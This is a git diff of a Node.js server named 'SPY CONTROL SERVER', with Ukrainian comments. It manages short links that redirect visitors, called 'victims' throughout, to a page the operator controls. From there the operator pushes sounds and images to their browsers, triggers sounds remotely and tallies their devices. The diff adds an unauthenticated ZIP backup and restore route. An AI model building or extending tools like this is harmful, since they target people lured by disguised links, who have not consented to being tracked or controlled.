@@ -1,23 +1,19 @@
 /**
- * SPY CONTROL SERVER v11.0 [AUTO MODE]
- * Включає: Socket.IO, File Uploads, Telegram Bot, Auto Mode Switch
+ * SPY CONTROL SERVER v12.0 [ULTIMATE]
+ * Features: Socket.IO, Telegram Bot, Auto Mode, ZIP Backup System
  */
 
 const express = require('express');
 const app = express();
+const AdmZip = require('adm-zip'); // Бібліотека для бекапів
 
 // --- 1. ГЛОБАЛЬНЕ СХОВИЩЕ ДЛЯ БОТА ---
 global.botFiles = [];
-global.messengerPosts = global.messengerPosts || [];
-global.messengerPosts = global.messengerPosts || [];
-global.bannedIPs = global.bannedIPs || new Set();
-global.mutedIPs = global.mutedIPs || new Map(); // ip => until timestamp
 
 // --- ПІДКЛЮЧЕННЯ БОТА ---
 try {
     require('./bot.js'); 
-    require('./messanger.js')(app); // app — це твій express()
-    console.log('✅ Telegram Bot, messanger linked successfully');
+    console.log('✅ Telegram Bot linked successfully');
 } catch (e) {
     console.log('⚠️ Bot file missing or error:', e.message);
 }
@@ -28,7 +24,6 @@ const { v4: uuidv4 } = require('uuid');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
-const AdmZip = require('adm-zip');
 
 // --- КОНФІГУРАЦІЯ ---
 const PORT = process.env.PORT || 3000;
@@ -42,7 +37,7 @@ if (!fs.existsSync(UPLOAD_DIR)) {
 app.use(express.json());
 app.use(express.static('public'));
 
-// --- MULTER ---
+// --- MULTER (Завантаження файлів) ---
 const storage = multer.diskStorage({
     destination: (req, file, cb) => cb(null, UPLOAD_DIR),
     filename: (req, file, cb) => {
@@ -96,7 +91,7 @@ function parseDevice(ua) {
     return "📱 Device";
 }
 
-// !!! ОНОВЛЕНО: Додано autoMode !!!
+// Створення сесії з параметром AUTO MODE
 function createSessionObject(req, soundUrl = '', imageUrl = '', autoMode = false) {
     const id = uuidv4();
     const shortCode = generateShortCode();
@@ -109,7 +104,7 @@ function createSessionObject(req, soundUrl = '', imageUrl = '', autoMode = false
         shortCode: shortCode,
         sound: soundUrl,
         image: imageUrl,
-        autoMode: autoMode, // <--- СТАТУС АВТО-РЕЖИМУ (true/false)
+        autoMode: autoMode, // <--- Зберігаємо статус тумблера
         createdAt: new Date().toLocaleString('uk-UA'),
         lastActiveAt: Date.now(),
         totalVictims: 0,
@@ -123,7 +118,7 @@ function createSessionObject(req, soundUrl = '', imageUrl = '', autoMode = false
     return sessions[id];
 }
 
-// !!! ОНОВЛЕНО: Надсилаємо статус авто-режиму жертві !!!
+// Оновлення клієнтів (відправка медіа та статусу AUTO)
 function broadcastUpdate(roomId) {
     const s = sessions[roomId];
     if (!s) return;
@@ -136,27 +131,9 @@ function broadcastUpdate(roomId) {
     io.to(roomId).emit('update-media', { 
         sound: currentSound, 
         image: currentImage,
-        auto: s.autoMode // <--- ВІДПРАВЛЯЄМО true АБО false
+        auto: s.autoMode // <--- Відправляємо true/false жертві
     });
 }
-
-// --- ROUTES ---
-
-app.get('/', (req, res) => res.redirect('/admin.html'));
-// Додаємо редірект на бета-адмінку, якщо треба
-app.get('/beta', (req, res) => res.redirect('/beta_admin.html'));
-
-// 1. Створення (JSON)
-app.post('/create', (req, res) => {
-    try {
-        // Отримуємо auto_mode з запиту
-        const { sound, image, auto_mode } = req.body;
-        const session = createSessionObject(req, sound, image, auto_mode);
-        res.json({ id: session.id, shortUrl: session.shortCode });
-    } catch (e) {
-        res.status(500).json({ error: "Server error" });
-    }
-});
 
 // --- СИСТЕМА BACKUP (ZIP) ---
 
@@ -167,13 +144,10 @@ app.get('/backup-all', (req, res) => {
         
         // Створюємо JSON з даними
         const dbData = JSON.stringify({
-    sessions,
-    shortLinks,
-    botFiles: global.botFiles,
-    messengerPosts: global.messengerPosts,
-    bannedIPs: Array.from(global.bannedIPs),
-    mutedIPs: Array.from(global.mutedIPs.entries())
-}, null, 2);
+            sessions,
+            shortLinks,
+            botFiles: global.botFiles
+        }, null, 2);
         
         zip.addFile("database.json", Buffer.from(dbData, "utf8"));
 
@@ -192,36 +166,33 @@ app.get('/backup-all', (req, res) => {
 });
 
 // 2. ВІДНОВИТИ ВСЕ (Restore)
-// 2. ВІДНОВИТИ ВСЕ (Restore)
 app.post('/restore-all', upload.single('backup'), (req, res) => {
     if (!req.file) return res.status(400).json({ error: "No file provided" });
+
     try {
         const zip = new AdmZip(req.file.path);
-       
+        
         // 1. Відновлюємо базу JSON
         const dbEntry = zip.getEntry("database.json");
         if (dbEntry) {
             const data = JSON.parse(dbEntry.getData().toString('utf8'));
-           
+            
             // Очищуємо старі дані та копіюємо нові
             for (let key in sessions) delete sessions[key];
             for (let key in shortLinks) delete shortLinks[key];
-           
+            
             Object.assign(sessions, data.sessions);
             Object.assign(shortLinks, data.shortLinks);
             global.botFiles = data.botFiles || [];
-            
-            // === ОНОВЛЕННЯ ДЛЯ МЕСЕНДЖЕРА ===
-            global.messengerPosts = data.messengerPosts || [];
-            global.bannedIPs = new Set(data.bannedIPs || []);
-            global.mutedIPs = new Map(data.mutedIPs || []);
-            // ================================
         }
+
         // 2. Розпаковуємо файли в uploads
+        // false - не створювати підпапку, true - перезаписувати старі
         zip.extractEntryTo("uploads/", UPLOAD_DIR, false, true);
-        
-        // Видаляємо тимчасовий завантажений файл архіву
+
+        // Видаляємо тимчасовий файл
         fs.unlinkSync(req.file.path);
+
         console.log("♻️ Data restored from backup!");
         res.json({ success: true });
     } catch (e) {
@@ -230,10 +201,26 @@ app.post('/restore-all', upload.single('backup'), (req, res) => {
     }
 });
 
-// 2. Створення (Upload)
+// --- СТАНДАРТНІ МАРШРУТИ ---
+
+app.get('/', (req, res) => res.redirect('/admin.html'));
+app.get('/beta', (req, res) => res.redirect('/beta_admin.html'));
+
+// Створення (JSON)
+app.post('/create', (req, res) => {
+    try {
+        const { sound, image, auto_mode } = req.body;
+        const session = createSessionObject(req, sound, image, auto_mode);
+        res.json({ id: session.id, shortUrl: session.shortCode });
+    } catch (e) {
+        res.status(500).json({ error: "Server error" });
+    }
+});
+
+// Створення (Upload)
 app.post('/create-upload', upload.fields([{ name: 'images' }, { name: 'sounds' }]), (req, res) => {
     try {
-        // FormData передає boolean як рядок, конвертуємо
+        // Конвертуємо 'true'/'false' з FormData в boolean
         const isAuto = req.body.auto_mode === 'true';
         const session = createSessionObject(req, '', '', isAuto);
         
@@ -246,7 +233,7 @@ app.post('/create-upload', upload.fields([{ name: 'images' }, { name: 'sounds' }
     }
 });
 
-// 3. Оновлення сесії
+// Оновлення сесії
 app.post('/update-session/:id', (req, res) => {
     const id = req.params.id;
     if (!sessions[id]) return res.status(404).json({ error: 'Not found' });
@@ -254,14 +241,14 @@ app.post('/update-session/:id', (req, res) => {
     if (req.body.sound !== undefined) sessions[id].sound = req.body.sound;
     if (req.body.image !== undefined) sessions[id].image = req.body.image;
     
-    // Оновлюємо статус тумблера
+    // Оновлення Auto Mode
     if (req.body.auto_mode !== undefined) sessions[id].autoMode = req.body.auto_mode;
 
     broadcastUpdate(id);
     res.json({ success: true });
 });
 
-// 4. Завантаження файлів (картинки)
+// Завантаження файлів (картинки)
 app.post('/session/:id/upload-images', upload.array('images'), (req, res) => {
     const id = req.params.id;
     if (!sessions[id]) return res.status(404).json({ error: 'Not found' });
@@ -270,7 +257,7 @@ app.post('/session/:id/upload-images', upload.array('images'), (req, res) => {
     res.json({ success: true });
 });
 
-// 5. Завантаження файлів (звуки)
+// Завантаження файлів (звуки)
 app.post('/session/:id/upload-sounds', upload.array('sounds'), (req, res) => {
     const id = req.params.id;
     if (!sessions[id]) return res.status(404).json({ error: 'Not found' });
@@ -279,7 +266,7 @@ app.post('/session/:id/upload-sounds', upload.array('sounds'), (req, res) => {
     res.json({ success: true });
 });
 
-// 6. Список сесій
+// Список сесій (для Watch)
 app.get('/sessions', (req, res) => {
     const list = Object.values(sessions).map(s => {
         return {
@@ -293,14 +280,14 @@ app.get('/sessions', (req, res) => {
             creator: s.creator,
             imagesFiles: s.imagesFiles,
             soundsFiles: s.soundsFiles,
-            autoMode: s.autoMode // Показуємо у watch статус
+            autoMode: s.autoMode
         };
     }).sort((a, b) => b.lastActiveAt - a.lastActiveAt);
 
     res.json({ sessions: list, botFiles: global.botFiles || [] });
 });
 
-// 7. Видалення сесії
+// Видалення сесії
 app.delete('/session/:id', (req, res) => {
     const id = req.params.id;
     if (sessions[id]) {
@@ -315,7 +302,7 @@ app.delete('/session/:id', (req, res) => {
     }
 });
 
-// 8. Видалення файлу бота
+// Видалення файлу бота
 app.delete('/bot-file/:filename', (req, res) => {
     const fname = req.params.filename;
     const idx = global.botFiles.findIndex(f => f.filename === fname);
@@ -328,7 +315,7 @@ app.delete('/bot-file/:filename', (req, res) => {
     }
 });
 
-// 9. Редірект
+// Редірект по короткому посиланню
 app.get('/:shortCode', (req, res) => {
     const code = req.params.shortCode;
     if (code === 'favicon.ico' || code.includes('.')) return res.sendStatus(404);
@@ -337,13 +324,14 @@ app.get('/:shortCode', (req, res) => {
     if (sessionId) {
         res.redirect(`/victim.html?id=${sessionId}`);
     } else {
-        res.status(404).send('<h1>404 - NOT FOUND</h1>');
+        res.status(404).send('<h1>404 - LINK NOT FOUND</h1>');
     }
 });
 
 // --- SOCKET.IO ---
 io.on('connection', (socket) => {
     
+    // Адмін
     socket.on('join-room-admin', (roomId) => {
         socket.join(roomId);
         sendVictimListToAdmin(roomId);
@@ -357,6 +345,7 @@ io.on('connection', (socket) => {
         io.to(roomId).emit('play-sound');
     });
 
+    // Жертва
     socket.on('join-room-victim', (data) => {
         const roomId = data.roomId;
         socket.join(roomId);
@@ -372,7 +361,7 @@ io.on('connection', (socket) => {
 
         if (sessions[roomId]) {
             sessions[roomId].totalVictims++;
-            // Відправляємо контент + AUTO MODE статус
+            // Відправляємо медіа + статус Auto Mode
             broadcastUpdate(roomId);
         }
 
@@ -397,4 +386,5 @@ function sendVictimListToAdmin(roomId) {
 // --- START ---
 http.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`💾 Backup system loaded`);
 });
